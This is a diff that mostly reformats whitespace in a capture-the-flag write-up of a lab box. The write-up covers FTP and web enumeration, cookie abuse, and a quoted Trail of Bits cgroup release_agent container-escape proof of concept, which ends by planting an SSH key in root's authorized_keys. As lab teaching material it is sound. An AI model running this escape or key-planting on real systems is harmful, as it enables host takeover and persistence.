@@ -7,8 +7,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 21   | FTP     |
-| 22   | SSH     |
+| 21 | FTP |
+| 22 | SSH |
 
 
 
@@ -28,16 +28,16 @@ Using binary mode to transfer files.
 ftp> ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
-drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
+drwxr-xr-x 2 ftp ftp 4096 Aug 28 2020 pub
 226 Directory send OK.
 ftp> cd pub
 250 Directory successfully changed.
 ftp> ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
--rw-r--r--    1 ftp      ftp           103 Aug 28  2020 info.txt
--rw-r--r--    1 ftp      ftp           248 Aug 26  2020 jokes.txt
--rw-r--r--    1 ftp      ftp        737512 Aug 18  2020 trace.pcapng
+-rw-r--r-- 1 ftp ftp 103 Aug 28 2020 info.txt
+-rw-r--r-- 1 ftp ftp 248 Aug 26 2020 jokes.txt
+-rw-r--r-- 1 ftp ftp 737512 Aug 18 2020 trace.pcapng
 226 Directory send OK.
 ```
 
@@ -50,16 +50,16 @@ I have included all the network info you requested, along with some of my favour
 - Paramore
 
 Taylor: Knock, knock.
-Josh:   Who's there?
+Josh: Who's there?
 Taylor: The interrupting cow.
-Josh:   The interrupting cow--
+Josh: The interrupting cow--
 Taylor: Moo
 
-Josh:   Knock, knock.
+Josh: Knock, knock.
 Taylor: Who's there?
-Josh:   Adore.
+Josh: Adore.
 Taylor: Adore who?
-Josh:   Adore is between you and I so please open up!
+Josh: Adore is between you and I so please open up!
 ```
 
 As we can see, there is a hint on `port knocking`, port knocking is a stealthy method used to open closed ports on a firewall by sending a specific sequence of connection attempts (knocks) to predefined ports. These ports appear closed from the outside, but when the correct sequence is received, the firewall temporarily opens a port (e.g., SSH) for the client. Itâ€™s like a secret handshake, only those who know the right knock pattern can get in. This technique adds an extra layer of obscurity and is often used to hide services from unauthorized users.
@@ -94,35 +94,35 @@ Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-04 18:17 EDT
 Nmap scan report for 10.10.20.176
 Host is up (0.17s latency).
 Not shown: 997 closed tcp ports (reset)
-PORT     STATE SERVICE  VERSION
-21/tcp   open  ftp      vsftpd 3.0.3
+PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
+|_drwxr-xr-x 2 ftp ftp 4096 Aug 28 2020 pub
 | ftp-syst: 
-|   STAT: 
+| STAT: 
 | FTP server status:
-|      Connected to ::ffff:10.14.21.28
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 2
-|      vsFTPd 3.0.3 - secure, fast, stable
+| Connected to ::ffff:10.14.21.28
+| Logged in as ftp
+| TYPE: ASCII
+| No session bandwidth limit
+| Session timeout in seconds is 300
+| Control connection is plain text
+| Data connections will be plain text
+| At session startup, client count was 2
+| vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
-22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
-|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
-|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
-8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
+| 2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
+| 256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
+|_ 256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
+8080/tcp open ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
 |_http-title: Misguided Ghosts
 |_ssl-date: TLS randomness does not represent time
 |_http-server-header: Werkzeug/1.0.1 Python/2.7.18
 | ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN
 | Not valid before: 2020-08-11T16:52:11
-|_Not valid after:  2021-08-11T16:52:11
+|_Not valid after: 2021-08-11T16:52:11
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
@@ -135,28 +135,28 @@ There's a simple web application with an image, let's fuzz:
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "https://10.10.20.176:8080/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : https://10.10.20.176:8080/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .html .txt .git .js
+ :: Method : GET
+ :: URL : https://10.10.20.176:8080/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .php .html .txt .git .js
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-login        [Status: 200, Size: 761, Words: 107, Lines: 29, Duration: 178ms]
+login [Status: 200, Size: 761, Words: 107, Lines: 29, Duration: 178ms]
 ```
 
 Login page, we don't have any credentials yet, let's try SQLI:
@@ -249,26 +249,26 @@ We can fuzz with our new cookie to check if we missed anything:
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "https://10.10.20.176:8080/FUZZ" -H "Cookie: login=hayley_is_admin" -H "User-Agent: Mozilla/5.0" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : https://10.10.20.176:8080/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Header           : Cookie: login=hayley_is_admin
- :: Header           : User-Agent: Mozilla/5.0
+ :: Method : GET
+ :: URL : https://10.10.20.176:8080/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Header : Cookie: login=hayley_is_admin
+ :: Header : User-Agent: Mozilla/5.0
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
 photos
@@ -348,20 +348,20 @@ We can check that `zac`'s home is inside of the container, we can find this:
 ```bash
 ls -la /home
 total 12
-drwxr-xr-x    1 root     root          4096 Jul  4 22:16 .
-drwxr-xr-x    1 root     root          4096 Jul  4 22:16 ..
-drwxr-xr-x    3 root     root          4096 Jul  4 22:16 zac
+drwxr-xr-x 1 root root 4096 Jul 4 22:16 .
+drwxr-xr-x 1 root root 4096 Jul 4 22:16 ..
+drwxr-xr-x 3 root root 4096 Jul 4 22:16 zac
 ls -la /home/zac
 total 12
-drwxr-xr-x    3 root     root          4096 Jul  4 22:16 .
-drwxr-xr-x    1 root     root          4096 Jul  4 22:16 ..
-drwxrwxr-x    2 1001     1001          4096 Aug 26  2020 notes
+drwxr-xr-x 3 root root 4096 Jul 4 22:16 .
+drwxr-xr-x 1 root root 4096 Jul 4 22:16 ..
+drwxrwxr-x 2 1001 1001 4096 Aug 26 2020 notes
 ls -la /home/zac/notes
 total 16
-drwxrwxr-x    2 1001     1001          4096 Aug 26  2020 .
-drwxr-xr-x    3 root     root          4096 Jul  4 22:16 ..
--rw-r--r--    1 1001     1002          1675 Aug 25  2020 .id_rsa
--rw-r--r--    1 1001     1002           270 Aug 25  2020 .secret
+drwxrwxr-x 2 1001 1001 4096 Aug 26 2020 .
+drwxr-xr-x 3 root root 4096 Jul 4 22:16 ..
+-rw-r--r-- 1 1001 1002 1675 Aug 25 2020 .id_rsa
+-rw-r--r-- 1 1001 1002 270 Aug 25 2020 .secret
 ```
 
 Let's read the secret:
@@ -387,7 +387,7 @@ On this article, we can check how to escape the container using a script:
 
 **Container Escape**
 
-So how do you escape a privileged container? By using this script. This example and PoC were taken from theÂ [Trail of Bits Blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/). Read the original post for a more detailed explanation of the PoC:
+So how do you escape a privileged container? By using this script. This example and PoC were taken from the [Trail of Bits Blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/). Read the original post for a more detailed explanation of the PoC:
 
 ```bash
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
@@ -403,30 +403,30 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-This PoC works by exploiting cgroupâ€™sÂ `release_agent`Â feature.
+This PoC works by exploiting cgroupâ€™s`release_agent` feature.
 
-After the last process in a cgroup exits, a command used to remove abandoned cgroups runs. This command is specified in theÂ `release_agent`Â file and it runs as root on the host machine. By default, this feature is disabled and theÂ `release_agent`Â path is empty.
+After the last process in a cgroup exits, a command used to remove abandoned cgroups runs. This command is specified in the`release_agent` file and it runs as root on the host machine. By default, this feature is disabled and the`release_agent` path is empty.
 
-This exploit runs code through theÂ `release_agent`Â file. We need to create a cgroup, specify itsÂ `release_agent`Â file, and trigger theÂ `release_agent`Â by killing all the processes in the cgroup. The first line in the PoC creates a new group:
+This exploit runs code through the`release_agent` file. We need to create a cgroup, specify its`release_agent` file, and trigger the`release_agent` by killing all the processes in the cgroup. The first line in the PoC creates a new group:
 
 ```
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
 
-The next line enables theÂ `release_agent`Â feature:
+The next line enables the`release_agent` feature:
 
 ```
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
 
-Then, the next few lines write the path of our command file to theÂ `release_agent`Â file:
+Then, the next few lines write the path of our command file to the`release_agent` file:
 
 ```
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
 
-We can then start writing to our command file. This script will execute theÂ `ps aux`Â command and save it to theÂ `/output`Â file. We also need to set the scriptâ€™s execute permission bits:
+We can then start writing to our command file. This script will execute the`ps aux` command and save it to the`/output` file. We also need to set the scriptâ€™s execute permission bits:
 
 ```
 echo '#!/bin/sh' > /cmd
@@ -434,13 +434,13 @@ echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 ```
 
-Finally, trigger the attack by spawning a process that immediately ends inside the cgroup that we created. OurÂ `release_agent`Â script will execute after the process ends. You can now read the output ofÂ `ps aux`Â on the host machine in theÂ `/output`Â file:
+Finally, trigger the attack by spawning a process that immediately ends inside the cgroup that we created. Our`release_agent` script will execute after the process ends. You can now read the output of`ps aux` on the host machine in the`/output` file:
 
 ```
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-You can use the PoC to execute arbitrary commands on the host system. For example, you can use it to write your SSH key to the root userâ€™sÂ `authorized_keys`Â file:
+You can use the PoC to execute arbitrary commands on the host system. For example, you can use it to write your SSH key to the root userâ€™s`authorized_keys` file:
 
 ```
 cat id_rsa.pub >> /root/.ssh/authorized_keys
